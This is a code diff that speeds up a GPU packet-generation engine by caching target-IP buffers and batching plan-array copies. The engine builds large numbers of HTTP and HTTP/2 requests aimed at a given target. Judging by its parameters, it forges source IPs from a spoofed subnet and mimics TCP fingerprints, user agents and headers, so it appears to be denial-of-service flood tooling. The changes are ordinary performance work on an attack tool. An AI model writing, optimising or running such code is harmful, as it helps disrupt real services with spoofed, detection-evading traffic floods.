@@ -1166,6 +1166,8 @@ class GPUPayloadEngine:
         # Slot-specific output buffers for overlapping multi-stream pipelines.
         self._slot_packets_gpu = {0: self.packets_gpu}
         self._slot_packet_lengths = {0: self.packet_lengths}
+        self._target_ip_cache: Dict[str, Tuple[cp.ndarray, int, int]] = {}
+        self._target_ip_cache_max = 16
         
         # Default Components
         self.methods = _validate_component_list("methods", ["GET", "POST", "HEAD"]) or []
@@ -1230,6 +1232,21 @@ class GPUPayloadEngine:
             self._slot_packet_lengths[slot_id] = packet_lengths
         return packets_gpu, packet_lengths
 
+    def _get_target_ip_gpu_material(self, target_ipv4: ipaddress.IPv4Address) -> Tuple[cp.ndarray, int, int]:
+        target_ip_text = str(target_ipv4)
+        cached = self._target_ip_cache.get(target_ip_text)
+        if cached is not None:
+            return cached
+        target_ip_bytes = cp.asarray(np.frombuffer(target_ip_text.encode(), dtype=np.uint8), dtype=cp.uint8)
+        material = (target_ip_bytes, len(target_ip_text), int(target_ipv4))
+        self._target_ip_cache[target_ip_text] = material
+        if len(self._target_ip_cache) > self._target_ip_cache_max:
+            try:
+                self._target_ip_cache.pop(next(iter(self._target_ip_cache)))
+            except Exception:
+                pass
+        return material
+
     def generate_fused_http(self, target_ip, target_port, real_src_ip, spoof_ip=True, stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8", window_sizes=None, mss_values=None, ttls=None, current_time=0, slot: int = 0):
         """
         P1 FIX #9: Uses fused kernel for maximum performance.
@@ -1247,9 +1264,7 @@ class GPUPayloadEngine:
         threads_per_block = 256
         blocks_per_grid = (self.count + (threads_per_block - 1)) // threads_per_block
         
-        target_ip_text = str(target_ipv4)
-        target_ip_bytes = cp.asarray(np.frombuffer(target_ip_text.encode(), dtype=np.uint8), dtype=cp.uint8)
-        target_ip_int = int(target_ipv4)
+        target_ip_bytes, target_ip_len, target_ip_int = self._get_target_ip_gpu_material(target_ipv4)
         real_src_ip_int = int(real_src_ipv4)
         
         # Prepare TCP Mimicry Arrays
@@ -1268,7 +1283,7 @@ class GPUPayloadEngine:
             self.d_methods, self.d_m_offs, self.d_m_lens, self.n_methods,
             self.d_paths, self.d_p_offs, self.d_p_lens, self.n_paths,
             self.d_uas, self.d_u_offs, self.d_u_lens, self.n_uas,
-            target_ip_bytes, len(target_ip_text),
+            target_ip_bytes, target_ip_len,
             np.int64(gateway_mac),
             np.int64(spoof_base_ip),
             np.int64(spoof_mask),
@@ -1316,30 +1331,34 @@ class GPUPayloadEngine:
             self.h2_valid_flags,
         )
 
-        valid_flags = cp.asnumpy(self.h2_valid_flags[:plan_count])
-        method_idx = cp.asnumpy(self.h2_method_idx[:plan_count])
-        path_idx = cp.asnumpy(self.h2_path_idx[:plan_count])
-        ua_idx = cp.asnumpy(self.h2_ua_idx[:plan_count])
-        accept_idx = cp.asnumpy(self.h2_accept_idx[:plan_count])
-        lang_idx = cp.asnumpy(self.h2_lang_idx[:plan_count])
-        body_kind = cp.asnumpy(self.h2_body_kind[:plan_count])
-        msg_seed = cp.asnumpy(self.h2_msg_seed[:plan_count])
-        step_used = cp.asnumpy(self.h2_step_used[:plan_count])
+        plan_matrix = cp.empty((plan_count, 9), dtype=cp.uint32)
+        plan_matrix[:, 0] = self.h2_valid_flags[:plan_count].astype(cp.uint32, copy=False)
+        plan_matrix[:, 1] = self.h2_method_idx[:plan_count].astype(cp.uint32, copy=False)
+        plan_matrix[:, 2] = self.h2_path_idx[:plan_count].astype(cp.uint32, copy=False)
+        plan_matrix[:, 3] = self.h2_ua_idx[:plan_count].astype(cp.uint32, copy=False)
+        plan_matrix[:, 4] = self.h2_accept_idx[:plan_count].astype(cp.uint32, copy=False)
+        plan_matrix[:, 5] = self.h2_lang_idx[:plan_count].astype(cp.uint32, copy=False)
+        plan_matrix[:, 6] = self.h2_body_kind[:plan_count].astype(cp.uint32, copy=False)
+        plan_matrix[:, 7] = self.h2_msg_seed[:plan_count]
+        plan_matrix[:, 8] = self.h2_step_used[:plan_count].astype(cp.uint32, copy=False)
+        plan_np = cp.asnumpy(plan_matrix)
         resource_chain = _resolve_resource_chain()
         step_rng = random.Random((int(self.rng_seed) << 32) ^ int(current_time) ^ int(plan_count))
 
         items: List[H2RequestPlanItem] = []
         for i in range(plan_count):
-            if int(valid_flags[i]) == 0:
+            row = plan_np[i]
+            if int(row[0]) == 0:
                 continue
-            m = self._to_text(self.methods[int(method_idx[i]) % self.n_methods])
-            p = self._to_text(self.paths[int(path_idx[i]) % self.n_paths])
-            u = self._to_text(self.uas[int(ua_idx[i]) % self.n_uas])
-            accept_v = str(self.accept_headers[int(accept_idx[i]) % len(self.accept_headers)])
-            lang_v = str(self.accept_languages[int(lang_idx[i]) % len(self.accept_languages)])
-            seed_v = int(msg_seed[i]) & 0xFFFFFFFF
-            kind_v = int(body_kind[i]) % 5
-            p = _apply_session_suffix(p, int(step_used[i]), rng=step_rng, chain=resource_chain)
+            m = self._to_text(self.methods[int(row[1]) % self.n_methods])
+            p = self._to_text(self.paths[int(row[2]) % self.n_paths])
+            u = self._to_text(self.uas[int(row[3]) % self.n_uas])
+            accept_v = str(self.accept_headers[int(row[4]) % len(self.accept_headers)])
+            lang_v = str(self.accept_languages[int(row[5]) % len(self.accept_languages)])
+            seed_v = int(row[7]) & 0xFFFFFFFF
+            kind_v = int(row[6]) % 5
+            step_v = int(row[8])
+            p = _apply_session_suffix(p, step_v, rng=step_rng, chain=resource_chain)
             body_v, content_type_v = _build_plan_body(m, p, kind_v, seed_v)
             headers_v = _build_plan_headers(
                 accept_value=accept_v,
@@ -1347,7 +1366,7 @@ class GPUPayloadEngine:
                 content_type=content_type_v,
                 body_len=len(body_v) if body_v is not None else 0,
                 seed=seed_v,
-                step=int(step_used[i]),
+                step=step_v,
             )
             ws_auth, ws_subscribe, ws_ping = _build_ws_plan_messages(p, seed_v)
             items.append(
@@ -1373,9 +1392,7 @@ class GPUPayloadEngine:
         blocks_per_grid = (self.count + (threads_per_block - 1)) // threads_per_block
         
         target_ipv4 = _parse_ipv4_address(target_ip, "target_ip")
-        target_ip_text = str(target_ipv4)
-        target_ip_bytes = cp.asarray(np.frombuffer(target_ip_text.encode(), dtype=np.uint8), dtype=cp.uint8)
-        target_ip_int = int(target_ipv4)
+        target_ip_bytes, target_ip_len, target_ip_int = self._get_target_ip_gpu_material(target_ipv4)
         self.packet_lengths[:self.count] = 0
         
         assemble_http_payload_kernel[blocks_per_grid, threads_per_block, stream](
@@ -1383,7 +1400,7 @@ class GPUPayloadEngine:
             self.d_methods, self.d_m_offs, self.d_m_lens, self.n_methods,
             self.d_paths, self.d_p_offs, self.d_p_lens, self.n_paths,
             self.d_uas, self.d_u_offs, self.d_u_lens, self.n_uas,
-            target_ip_bytes, len(target_ip_text), target_ip_int, self.packet_lengths
+            target_ip_bytes, target_ip_len, target_ip_int, self.packet_lengths
         )
 
 
